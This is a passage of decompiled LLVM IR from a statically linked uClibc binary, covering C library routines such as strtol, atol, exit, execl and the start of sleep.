  %v1_13110 = phi i32 [ 3, %bb21 ], [ %v1_131087, %bb20 ], [ %v1_131086, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_19f08.501 to i32), i32* %r2.global-to-local, align 4
  %v4_13108 = mul i32 %v1_13110, 4
  %v5_13108 = add i32 %v4_13108, ptrtoint (i32* @global_var_19f08.501 to i32)
  store i32 %v5_13108, i32* %r3.global-to-local, align 4
  %v1_1310c = add i32 %v4_13108, add (i32 ptrtoint (i32* @global_var_19f08.501 to i32), i32 20)
  %v2_1310c = inttoptr i32 %v1_1310c to i32*
  %v3_1310c = load i32, i32* %v2_1310c, align 4
  store i32 %v3_1310c, i32* %r1.global-to-local, align 4
  %v6_13110 = inttoptr i32 %v5_13108 to i32*
  %v7_13110 = load i32, i32* %v6_13110, align 4
  store i32 %v7_13110, i32* %r2.global-to-local, align 4
  %v1_13114 = add i32 %tmp, 4
  store i32 %v1_13114, i32* @r6, align 4
  %v4_13118 = mul i32 %v3_1310c, 4
  %v5_13118 = add i32 %v4_13118, %v1_13114
  store i32 %v5_13118, i32* %r3.global-to-local, align 4
  %v2_1311c = add i32 %arg3, 24
  %v3_1311c = inttoptr i32 %v2_1311c to i32*
  store i32 %v5_13118, i32* %v3_1311c, align 4
  %v0_13120 = load i32, i32* %r2.global-to-local, align 4
  %v1_13120 = load i32, i32* @r5, align 4
  %v2_13120 = add i32 %v1_13120, 20
  %v3_13120 = inttoptr i32 %v2_13120 to i32*
  store i32 %v0_13120, i32* %v3_13120, align 4
  %v0_13124 = load i32, i32* %r1.global-to-local, align 4
  %v1_13124 = load i32, i32* @r5, align 4
  %v2_13124 = add i32 %v1_13124, 16
  %v3_13124 = inttoptr i32 %v2_13124 to i32*
  store i32 %v0_13124, i32* %v3_13124, align 4
  %v0_13128 = load i32, i32* @r4, align 4
  %v1_13128 = load i32, i32* @r5, align 4
  %v2_13128 = add i32 %v1_13128, 12
  %v3_13128 = inttoptr i32 %v2_13128 to i32*
  store i32 %v0_13128, i32* %v3_13128, align 4
  %v0_1312c = load i32, i32* @r6, align 4
  %v1_1312c = load i32, i32* @r5, align 4
  %v2_1312c = add i32 %v1_1312c, 8
  %v3_1312c = inttoptr i32 %v2_1312c to i32*
  store i32 %v0_1312c, i32* %v3_1312c, align 4
  %v0_13130 = load i32, i32* @r5, align 4
  store i32 %v0_13130, i32* %r1.global-to-local, align 4
  %v0_13134 = load i32, i32* @r0, align 4
  %v2_13134 = inttoptr i32 %v0_13134 to i32*
  %v3_13134 = call i32 @srandom_r(i32* %v2_13134, i32 %v0_13130)
  store i32 %v3_13134, i32* %r0.global-to-local, align 4
  %v0_13138 = load i32, i32* @r4, align 4
  %v2_13138 = icmp eq i32 %v0_13138, 0
  br i1 %v2_13138, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1315412 = load i32, i32* @r7, align 4
  %v2_1315413 = inttoptr i32 %v1_1315412 to i32*
  store i32 0, i32* %v2_1315413, align 4
  %v1_13158 = load i32, i32* @r4, align 4
  store i32 %v1_13158, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_1313c = load i32, i32* @r5, align 4
  %v2_1313c = add i32 %v1_1313c, 4
  %v3_1313c = inttoptr i32 %v2_1313c to i32*
  %v4_1313c = load i32, i32* %v3_1313c, align 4
  %v1_13140 = load i32, i32* @r6, align 4
  %v3_13140 = sub i32 %v4_1313c, %v1_13140
  %v4_13144 = sdiv i32 %v3_13140, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1314c = mul i32 %v4_13144, 5
  %v5_1314c = add i32 %v4_1314c, %v0_13138
  store i32 %v5_1314c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13154 = load i32, i32* @r7, align 4
  %v2_13154 = inttoptr i32 %v1_13154 to i32*
  store i32 0, i32* %v2_13154, align 4
  %v1_1315c = load i32, i32* %r3.global-to-local, align 4
  %v2_1315c = load i32, i32* @r7, align 4
  %v3_1315c = inttoptr i32 %v2_1315c to i32*
  store i32 %v1_1315c, i32* %v3_1315c, align 4
  %v17_13160.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_13160 = phi i32 [ %v1_13158, %bb26 ], [ %v17_13160.pre, %.thread4 ]
  %v2_13160 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13160, i32* %r4.global-to-local, align 4
  ret i32 %v17_13160

dec_label_pc_13164:                               ; preds = %dec_label_pc_130e8
  %v0_13164 = call i32 @__errno_location()
  store i32 %v0_13164, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1316c = inttoptr i32 %v0_13164 to i32*
  store i32 22, i32* %v2_1316c, align 4
  %v0_13170 = call i32 @__errno_location()
  %v0_13174 = load i32, i32* %r4.global-to-local, align 4
  %v2_13174 = inttoptr i32 %v0_13170 to i32*
  store i32 %v0_13174, i32* %v2_13174, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1317c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1317c, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_130f8, { 1, 0 }
  uselistorder i1 %v7_130d0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_19f08.501 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19f08.501 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1318c = call i32 @strtol()
  ret i32 %v0_1318c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_13194 = call i32 @_stdlib_strto_l()
  ret i32 %v0_13194
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13198 = load i32, i32* @r4, align 4
  store i32 %v3_13198, i32* %stack_var_-36, align 4
  %v0_1319c = load i32, i32* @r1, align 4
  store i32 %v0_1319c, i32* %sb.global-to-local, align 4
  %v0_131a0 = load i32, i32* @r2, align 4
  store i32 %v0_131a0, i32* %r5.global-to-local, align 4
  %v0_131a4 = load i32, i32* @r3, align 4
  store i32 %v0_131a4, i32* %fp.global-to-local, align 4
  %v0_131a8 = load i32, i32* @r0, align 4
  %v2_131bc.pre = load i32, i32* @global_var_224e8, align 4
  br label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_131b4, %entry
  %v0_131ec = phi i32 [ %v0_131a8, %entry ], [ %v1_131b0, %dec_label_pc_131b4 ]
  store i32 %v0_131ec, i32* %r4.global-to-local, align 4
  %v1_131b8 = inttoptr i32 %v0_131ec to i8*
  %v2_131b8 = load i8, i8* %v1_131b8, align 1
  %v3_131b8 = zext i8 %v2_131b8 to i32
  %v3_131c0 = mul nuw nsw i32 %v3_131b8, 2
  %v4_131c0 = add i32 %v3_131c0, %v2_131bc.pre
  %v5_131c0 = inttoptr i32 %v4_131c0 to i8*
  %v6_131c0 = load i8, i8* %v5_131c0, align 1
  %v1_131c4 = and i8 %v6_131c0, 32
  %v2_131c4 = icmp eq i8 %v1_131c4, 0
  %v1_131b0 = add i32 %v0_131ec, 1
  br i1 %v2_131c4, label %dec_label_pc_131cc, label %dec_label_pc_131b4

dec_label_pc_131cc:                               ; preds = %dec_label_pc_131b4
  %v7_131cc = icmp eq i8 %v2_131b8, 43
  br i1 %v7_131cc, label %dec_label_pc_131ec, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %dec_label_pc_131cc
  %v7_131d4 = icmp eq i8 %v2_131b8, 45
  br i1 %v7_131d4, label %dec_label_pc_131ec, label %bb

bb:                                               ; preds = %dec_label_pc_131d4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131ec:                               ; preds = %dec_label_pc_131cc, %dec_label_pc_131d4
  %storemerge43 = phi i32 [ 1, %dec_label_pc_131d4 ], [ 0, %dec_label_pc_131cc ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_131b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %bb, %dec_label_pc_131ec
  %v0_13210 = phi i32 [ %v0_131ec, %bb ], [ %v1_131b0, %dec_label_pc_131ec ]
  %v1_131f0 = and i32 %v0_131a0, -17
  %v3_131f0 = icmp eq i32 %v1_131f0, 0
  br i1 %v3_131f0, label %dec_label_pc_131fc, label %bb54

bb54:                                             ; preds = %dec_label_pc_131f0
  br label %bb58

dec_label_pc_131fc:                               ; preds = %dec_label_pc_131f0
  %v1_131fc = inttoptr i32 %v0_13210 to i8*
  %v2_131fc = load i8, i8* %v1_131fc, align 1
  %v7_13200 = icmp eq i8 %v2_131fc, 48
  %v1_13204 = add i32 %v0_131a0, 10
  store i32 %v1_13204, i32* %r5.global-to-local, align 4
  br i1 %v7_13200, label %dec_label_pc_13210, label %bb55

bb55:                                             ; preds = %dec_label_pc_131fc
  br label %.thread8

dec_label_pc_13210:                               ; preds = %dec_label_pc_131fc
  %v1_13210 = add i32 %v0_13210, 1
  %v2_13210 = inttoptr i32 %v1_13210 to i8*
  %v3_13210 = load i8, i8* %v2_13210, align 1
  %v4_13210 = zext i8 %v3_13210 to i32
  store i32 %v1_13210, i32* %r4.global-to-local, align 4
  %v1_13214 = or i32 %v4_13210, 32
  %v7_13218 = icmp eq i32 %v1_13214, 120
  %v1_1321c = add i32 %v0_131a0, 8
  store i32 %v1_1321c, i32* %r5.global-to-local, align 4
  br i1 %v7_13218, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_13210
  %v3_13228 = mul i32 %v1_1321c, 2
  store i32 %v3_13228, i32* %r5.global-to-local, align 4
  %v2_1322c = add i32 %v0_13210, 2
  store i32 %v2_1322c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13210, %bb55, %bb56
  %v1_132f028 = phi i32 [ %v0_131a8, %bb55 ], [ %v1_13210, %bb56 ], [ %v1_13210, %dec_label_pc_13210 ]
  %v0_1327819 = phi i32 [ %v0_13210, %bb55 ], [ %v2_1322c, %bb56 ], [ %v1_13210, %dec_label_pc_13210 ]
  %v0_13230 = phi i32 [ %v1_13204, %bb55 ], [ %v3_13228, %bb56 ], [ %v1_1321c, %dec_label_pc_13210 ]
  %v5_13234 = icmp slt i32 %v0_13230, 16
  br i1 %v5_13234, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_132f027 = phi i32 [ %v0_131a8, %bb54 ], [ %v1_132f028, %.thread8 ], [ %v1_132f028, %bb57 ]
  %v0_1327818 = phi i32 [ %v0_13210, %bb54 ], [ %v0_1327819, %.thread8 ], [ %v0_1327819, %bb57 ]
  %v0_13248 = phi i32 [ %v0_131a0, %bb54 ], [ %v0_13230, %.thread8 ], [ 16, %bb57 ]
  %v1_13238 = add i32 %v0_13248, -2
  %tmp = icmp ugt i32 %v1_13238, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13248

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_132ec

dec_label_pc_13248:                               ; preds = %bb58
  %v2_13250 = urem i32 -1, %v0_13248
  %v1_13260 = urem i32 %v2_13250, 256
  store i32 %v1_13260, i32* %sl.global-to-local, align 4
  %v2_13264 = udiv i32 -1, %v0_13248
  store i32 0, i32* @ip, align 4
  store i32 %v2_13264, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13278

dec_label_pc_13274:                               ; preds = %bb65, %dec_label_pc_132d4
  %v0_13274 = phi i32 [ %v1_132a4, %bb65 ], [ %v0_13274.pre, %dec_label_pc_132d4 ]
  br label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %dec_label_pc_13248, %dec_label_pc_13274
  %v1_132f025 = phi i32 [ %v1_132f027, %dec_label_pc_13248 ], [ %v0_13274, %dec_label_pc_13274 ]
  %v0_132a4 = phi i32 [ %v0_1327818, %dec_label_pc_13248 ], [ %v0_13274, %dec_label_pc_13274 ]
  %v1_13278 = inttoptr i32 %v0_132a4 to i8*
  %v2_13278 = load i8, i8* %v1_13278, align 1
  %v3_13278 = zext i8 %v2_13278 to i32
  %v1_1327c = add nsw i32 %v3_13278, -48
  %v1_13280 = urem i32 %v1_1327c, 256
  %v1_13288 = or i32 %v3_13278, 32
  %tmp73 = icmp ult i32 %v1_13280, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_13290

dec_label_pc_13290:                               ; preds = %dec_label_pc_13278
  %tmp74 = icmp ugt i32 %v1_13288, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_13290
  %v1_13294 = add nsw i32 %v1_13288, -87
  %v5_1329c = urem i32 %v1_13294, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_13278, %dec_label_pc_13290, %bb59
  %v3_132cc = phi i32 [ %v1_13280, %dec_label_pc_13278 ], [ 40, %dec_label_pc_13290 ], [ %v5_1329c, %bb59 ]
  %v1_132a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_132a4 = add i32 %v0_132a4, 1
  store i32 %v1_132a4, i32* %r4.global-to-local, align 4
  %v6_132a8 = icmp slt i32 %v3_132cc, %v1_132a0
  br i1 %v6_132a8, label %dec_label_pc_132ac, label %dec_label_pc_132ec.loopexit

dec_label_pc_132ac:                               ; preds = %bb60
  %v0_132ac = load i32, i32* @ip, align 4
  %v1_132ac = load i32, i32* %r8.global-to-local, align 4
  %v9_132ac = icmp eq i32 %v0_132ac, %v1_132ac
  br i1 %v9_132ac, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_132ac
  br label %dec_label_pc_132bc

bb61:                                             ; preds = %dec_label_pc_132ac
  %v3_132ac = icmp ult i32 %v0_132ac, %v1_132ac
  br i1 %v3_132ac, label %dec_label_pc_132bc, label %dec_label_pc_132d4

dec_label_pc_132bc:                               ; preds = %bb61, %.thread37
  %v4_132c42240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_132bc = load i32, i32* %sl.global-to-local, align 4
  %v3_132bc = icmp uge i32 %v3_132cc, %v1_132bc
  %v9_132bc = icmp eq i32 %v3_132cc, %v1_132bc
  %v2_132c0 = xor i1 %v3_132bc, true
  %v3_132c0 = or i1 %v9_132bc, %v2_132c0
  br i1 %v3_132c0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_132bc
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_132bc, %bb62
  %v4_132c4 = phi i32 [ %v4_132c42240, %dec_label_pc_132bc ], [ 0, %bb62 ]
  %v2_132c4 = xor i1 %v9_132bc, true
  %v3_132c4 = and i1 %v3_132bc, %v2_132c4
  br i1 %v3_132c4, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_132c4 = urem i32 %v4_132c4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_132c8 = phi i32 [ %v5_132c4, %bb64 ], [ %v4_132c4, %bb63 ]
  %v2_132c8 = icmp eq i32 %v0_132c8, 0
  br i1 %v2_132c8, label %bb65, label %dec_label_pc_132d4

bb65:                                             ; preds = %thread-pre-split
  %v4_132cc = mul i32 %v0_132ac, %v1_132a0
  %v5_132cc = add i32 %v4_132cc, %v3_132cc
  store i32 %v5_132cc, i32* @ip, align 4
  br label %dec_label_pc_13274

dec_label_pc_132d4:                               ; preds = %bb61, %thread-pre-split
  %v0_132d4 = call i32 @__errno_location()
  %v0_132d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_132d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_132d8 = and i32 %v1_132d8, %v0_132d8
  store i32 %v2_132d8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_132e4 = inttoptr i32 %v0_132d4 to i32*
  store i32 34, i32* %v2_132e4, align 4
  %v0_13274.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13274

dec_label_pc_132ec.loopexit:                      ; preds = %bb60
  %v0_132ec.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_132ec

dec_label_pc_132ec:                               ; preds = %.thread, %dec_label_pc_132ec.loopexit
  %v1_132f0 = phi i32 [ %v1_132f025, %dec_label_pc_132ec.loopexit ], [ %v1_132f027, %.thread ]
  %v2_132f0 = phi i32 [ %v0_132ec.pre, %dec_label_pc_132ec.loopexit ], [ %v0_1319c, %.thread ]
  %v2_132ec = icmp eq i32 %v2_132f0, 0
  br i1 %v2_132ec, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_132ec
  %v3_132f0 = inttoptr i32 %v2_132f0 to i32*
  store i32 %v1_132f0, i32* %v3_132f0, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_132ec, %bb66
  %v0_132f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_132f4 = icmp eq i32 %v0_132f4, 0
  %. = select i1 %v2_132f4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_13300 = load i32, i32* %fp.global-to-local, align 4
  %v2_13300 = icmp eq i32 %v0_13300, 0
  %v0_13324.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_13300, label %dec_label_pc_1331c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_13324.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1330c, label %dec_label_pc_1331c

dec_label_pc_1330c:                               ; preds = %bb70
  %v0_1330c = call i32 @__errno_location()
  %v2_13314 = inttoptr i32 %v0_1330c to i32*
  store i32 34, i32* %v2_13314, align 4
  %v0_13318 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13318, i32* @ip, align 4
  %v0_1331c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %bb70, %bb67, %dec_label_pc_1330c
  %v0_13324.pre = phi i32 [ %v0_13324.pre.pre, %bb70 ], [ %v0_13318, %dec_label_pc_1330c ], [ %v0_13324.pre.pre, %bb67 ]
  %v0_1331c = phi i32 [ %v0_132f4, %bb70 ], [ %v0_1331c.pre, %dec_label_pc_1330c ], [ %v0_132f4, %bb67 ]
  %v2_1331c = icmp eq i32 %v0_1331c, 0
  br i1 %v2_1331c, label %dec_label_pc_1331c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1331c
  %v2_13320 = sub i32 0, %v0_13324.pre
  store i32 %v2_13320, i32* @ip, align 4
  br label %dec_label_pc_1331c._crit_edge

dec_label_pc_1331c._crit_edge:                    ; preds = %dec_label_pc_1331c, %bb71
  %v0_13324 = phi i32 [ %v2_13320, %bb71 ], [ %v0_13324.pre, %dec_label_pc_1331c ]
  %v2_13328 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13328, i32* @r4, align 4
  ret i32 %v0_13324

; uselistorder directives
  uselistorder i32 %v0_13324.pre, { 1, 0 }
  uselistorder i32 %v0_13324.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_132c4, { 1, 0 }
  uselistorder i1 %v3_132bc, { 1, 0 }
  uselistorder i32 %v1_132bc, { 1, 0 }
  uselistorder i32 %v1_132a4, { 1, 0 }
  uselistorder i32 %v1_13288, { 1, 0 }
  uselistorder i32 %v1_13280, { 1, 0 }
  uselistorder i32 %v0_13274, { 1, 0 }
  uselistorder i32 %v0_13248, { 1, 0, 2 }
  uselistorder i32 %v3_13228, { 1, 0 }
  uselistorder i32 %v1_1321c, { 1, 0, 2 }
  uselistorder i32 %v0_13210, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_131b0, { 1, 0, 2 }
  uselistorder i32 %v0_131a8, { 1, 0, 2 }
  uselistorder i32 %v0_131a0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1331c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1331c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_132ec, { 1, 0 }
  uselistorder label %dec_label_pc_132d4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13278, { 1, 0 }
  uselistorder label %dec_label_pc_13274, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131f0, { 1, 0 }
  uselistorder label %dec_label_pc_131ec, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_13330 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_13330, i32* @r0, align 4
  %v1_1334c = call i32 @__pthread_return_void()
  %v1_1335c = call i32 @__pthread_return_0()
  %v2_13364 = load i32, i32* @global_var_28aa0.514, align 4
  %v2_13368 = icmp eq i32 %v2_13364, 0
  br i1 %v2_13368, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_13364)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_13330, i32* @r0, align 4
  %v1_13388 = call i32 @__pthread_return_void()
  store i32 %v1_13388, i32* @r0, align 4
  %v1_1338c = call i32 @__GI___uClibc_fini(i32 %v1_13388)
  store i32 78752, i32* @lr, align 4
  %v2_1339c = call i32 @_stdio_term()
  %v0_133a0 = load i32, i32* @r4, align 4
  %v1_133a4 = call i32 @__GI__exit(i32 %v0_133a0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_133c4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_133c4, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_133d4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_133d8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_133d8, i32* %stack_var_-32, align 4
  br label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %dec_label_pc_133e4, %entry
  %v0_133f8 = phi i32 [ %v1_133f8, %dec_label_pc_133e4 ], [ 0, %entry ]
  %v3_133e4 = phi i32 [ %v1_133ec, %dec_label_pc_133e4 ], [ %v2_133d8, %entry ]
  %v1_133e8 = inttoptr i32 %v3_133e4 to i32*
  %v2_133e8 = load i32, i32* %v1_133e8, align 4
  %v1_133ec = add i32 %v3_133e4, 4
  %v2_133f0 = icmp eq i32 %v2_133e8, 0
  store i32 %v1_133ec, i32* %stack_var_-32, align 4
  %v1_133f8 = add i32 %v0_133f8, 1
  store i32 %v1_133f8, i32* @lr, align 4
  br i1 %v2_133f0, label %dec_label_pc_13400, label %dec_label_pc_133e4

dec_label_pc_13400:                               ; preds = %dec_label_pc_133e4
  %v3_13400.neg = mul i32 %v1_133f8, -4
  %v1_13404.neg = add i32 %v2_133d4, -8
  %v2_13408 = add i32 %v1_13404.neg, %v3_13400.neg
  %v2_13410 = inttoptr i32 %v2_13408 to i32*
  store i32 %arg1, i32* %v2_13410, align 4
  store i32 %v2_133d8, i32* %stack_var_-32, align 4
  %v0_1341c = load i32, i32* @sp, align 4
  store i32 %v0_1341c, i32* @r1, align 4
  store i32 %v0_1341c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %dec_label_pc_13424.dec_label_pc_13424_crit_edge, %dec_label_pc_13400
  %v1_13438 = phi i32 [ %v5_13438, %dec_label_pc_13424.dec_label_pc_13424_crit_edge ], [ %v0_1341c, %dec_label_pc_13400 ]
  %v3_13424 = phi i32 [ %v3_13424.pre, %dec_label_pc_13424.dec_label_pc_13424_crit_edge ], [ %v2_133d8, %dec_label_pc_13400 ]
  %v1_13428 = inttoptr i32 %v3_13424 to i32*
  %v2_13428 = load i32, i32* %v1_13428, align 4
  %v0_1342c = load i32, i32* @lr, align 4
  %v1_1342c = add i32 %v0_1342c, -1
  store i32 %v1_1342c, i32* @lr, align 4
  %v7_1342c = icmp eq i32 %v0_1342c, 1
  %v1_13430 = add i32 %v3_13424, 4
  store i32 %v1_13430, i32* %stack_var_-32, align 4
  %v2_13438 = add i32 %v1_13438, 4
  %v3_13438 = inttoptr i32 %v2_13438 to i32*
  store i32 %v2_13428, i32* %v3_13438, align 4
  %v4_13438 = load i32, i32* %ip.global-to-local, align 4
  %v5_13438 = add i32 %v4_13438, 4
  store i32 %v5_13438, i32* %ip.global-to-local, align 4
  br i1 %v7_1342c, label %dec_label_pc_13440, label %dec_label_pc_13424.dec_label_pc_13424_crit_edge

dec_label_pc_13424.dec_label_pc_13424_crit_edge:  ; preds = %dec_label_pc_13424
  %v3_13424.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13424

dec_label_pc_13440:                               ; preds = %dec_label_pc_13424
  %v2_13444 = load i32, i32* @global_var_28aa8.519, align 4
  store i32 %v2_13444, i32* @r2, align 4
  %v0_13448 = call i32 @__GI_execve()
  ret i32 %v0_13448

; uselistorder directives
  uselistorder i32 %v5_13438, { 1, 0 }
  uselistorder i32 %v0_1342c, { 1, 0 }
  uselistorder i32 %v1_133f8, { 0, 2, 1 }
  uselistorder i32 %v1_133ec, { 1, 0 }
  uselistorder i32 %v3_133e4, { 1, 0 }
  uselistorder i32 %v2_133d8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13458 = load i32, i32* @r4, align 4
  store i32 %v3_13458, i32* %stack_var_-20, align 4
  %v6_13458 = load i32, i32* @r5, align 4
  %v9_13458 = load i32, i32* @r6, align 4
  %v16_13458 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_1345c = icmp eq i32 %arg1, 0
  %v2_13460 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_1345c, label %dec_label_pc_135e4, label %dec_label_pc_13478.preheader

dec_label_pc_13478.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_1348017 = add i32 %v16_13458, 124
  br label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %dec_label_pc_13478.preheader, %dec_label_pc_13470
  %v5_1348018 = phi i32 [ %v5_1348017, %dec_label_pc_13478.preheader ], [ %v5_13480, %dec_label_pc_13470 ]
  %v2_13474 = add i32 %v5_1348018, -136
  %v3_13474 = inttoptr i32 %v2_13474 to i32*
  store i32 0, i32* %v3_13474, align 4
  %v0_13478.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13478 = add i32 %v0_13478.pre, -1
  store i32 %v1_13478, i32* %r1.global-to-local, align 4
  %v6_13478 = icmp slt i32 %v1_13478, 0
  %v4_13480 = mul i32 %v1_13478, 4
  %v5_13480 = add i32 %v4_13480, %v16_13458
  br i1 %v6_13478, label %dec_label_pc_13488, label %dec_label_pc_13470

dec_label_pc_13488:                               ; preds = %dec_label_pc_13470
  %v2_13488 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_13488, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_13498 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_13498, i32* %stack_var_-28, align 4
